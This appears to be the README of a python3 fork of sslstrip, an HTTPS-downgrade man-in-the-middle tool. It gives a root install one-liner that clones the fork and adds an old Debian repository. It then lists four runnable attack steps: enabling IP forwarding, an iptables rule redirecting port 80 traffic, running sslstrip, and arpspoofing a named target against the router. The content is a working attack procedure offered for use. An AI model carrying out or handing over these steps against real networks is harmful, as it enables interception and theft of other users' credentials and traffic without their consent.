## This is a fork of sslstrip to python3

### Installing


----------

Edit APT Repo
----------
```ShellSession
nano /etc/apt/sources.list
```
# Add this repo
```ShellSession
deb http://ftp.debian.org/debian/ stretch main contrib non-free
```
#
# Install as root:
```ShellSession
apt update -y && apt install git -y && cd /usr/share && git clone https://github.com/4k4xs4pH1r3/sslstrip.git && sudo aptitude install python-twisted-web python3 python3-pip git -y && cd sslstrip && python setup.py install && python3 -m pip install -r requirements.txt && pip install twisted carbon autobahn autobahn && sudo aptitude install python2.7-twisted-bin python-twisted-words python-twisted-runner python3-twisted-bin-dbg python-twisted-runner-dbg python-twisted python3-twisted python-twisted-names python-twisted-mail python-twisted-bin-dbg python-twisted-bin python-twisted-web python-twisted-conch python-twisted-news python-twisted-core python-twisted-libravatar twisted-doc python3-pytest-twisted python2.7-twisted-core python3-twisted-bin python2.7-twisted && pip install --upgrade --ignore-installed pyopenssl && pip3 install --upgrade --ignore-installed pyopenssl && python3 sslstrip.py -h
``` 





# Running:
	sslstrip can be run from the source base without installation.  
	Just run 'python sslstrip.py -h' as a non-root user to get the
	command-line options.

	The four steps to getting this working (assuming you're running Linux)
	are:

	1) Flip your machine into forwarding mode (as root):
	   echo "1" > /proc/sys/net/ipv4/ip_forward

	2) Setup iptables to intercept HTTP requests (as root):
	   iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port <yourListenPort>

	3) Run sslstrip with the command-line options you'd like (see above).

	4) Run arpspoof to redirect traffic to your machine (as root):
	   arpspoof -i <yourNetworkdDevice> -t <yourTarget> <theRoutersIpAddress>

# More Info:
	http://www.thoughtcrime.org/software/sslstrip/
